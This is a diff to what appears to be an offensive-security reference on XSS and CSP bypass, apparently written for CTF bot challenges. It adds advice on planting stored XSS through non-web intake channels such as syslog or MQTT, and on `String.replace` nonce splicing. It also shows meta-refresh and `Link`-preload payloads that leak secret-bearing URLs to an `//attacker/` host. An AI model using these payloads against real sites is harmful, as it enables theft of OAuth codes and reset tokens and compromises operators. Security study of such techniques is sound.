@@ -33,6 +33,7 @@ High-yield sink families:
 - Shadow DOM and DOM clobbering
 - `javascript:` scheme handling in bots or previewers
 - MIME confusion where `.jpg`, `.svg`, or attachment names become active HTML
+- **non-HTTP ingest rendered by the UI** — when no web parameter is attacker-controlled, look for a second intake the app listens on (raw TCP/UDP protocol port, syslog, MQTT, mail, filenames, imported files) whose stored records the dashboard later renders. Frames accepted there are stored XSS against every operator with the page open; if the app sorts records into accepted/rejected views, make yours pass validation or it renders in a tab nobody watches
 
 Minimal payload ladder:
 
@@ -65,6 +66,7 @@ Always compare:
 Common routes:
 - whitelisted CDN behavior frameworks (`_hyperscript`, Alpine, htmx)
 - missing `base-uri` enabling `<base>` hijack against nonced relative scripts
+- server-side `String.replace(placeholder, userInput)` sinks: `` $` ``/`$'` in the replacement splice adjacent template text — including the nonce and raw quotes — into the escaped output, giving execution inside an already-nonced `<script>` (see `offensive-techniques/web-exploit-technique/references/xss-and-client.md`)
 - trusted backend routes that bypass frontend sanitization
 - whitelisted cloud-function domains serving attacker JS
 - same-origin script gadgets with attacker-controlled MIME or content
@@ -87,6 +89,7 @@ Patterns:
 ### Leaking a secret in the page URL (no script needed)
 
 When a bot opens a URL containing a secret (OAuth `code`, reset token, query/fragment id) and you only control a sub-resource or sanitized `<img>`:
+- Try first, no browser bug required: CSP restricts no **top-level navigation**, so injecting `<meta name="referrer" content="unsafe-url">` plus `<meta http-equiv="refresh" content="0;url=//attacker/">` leaks the full URL in `Referer` even under `default-src 'none'`. Details in `offensive-techniques/web-exploit-technique/references/xss-and-client.md`.
 - Chrome `Link` referer leak (CVE-2025-4664, builds < 136.0.7103.113): the attacker sub-resource responds `Link: <//attacker/leak>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` → Chrome preloads with the **full Referer including query**. Only `<img src=//attacker/x>` is required on the victim page.
 - `baseURI`/`srcdoc` inheritance: a sandboxed `srcdoc` reads the embedder's full URL; older Chrome leaks it cross-origin via session-history confusion (Chromium 41487933). Needs the victim framable.
 - Cookie context decides the delivery: `SameSite=Lax`/unset cookies ride only **top-level** navigations/popups, never cross-site iframes or sub-resources — so make the bot mint the secret via top-level navigation, then read the resulting URL.
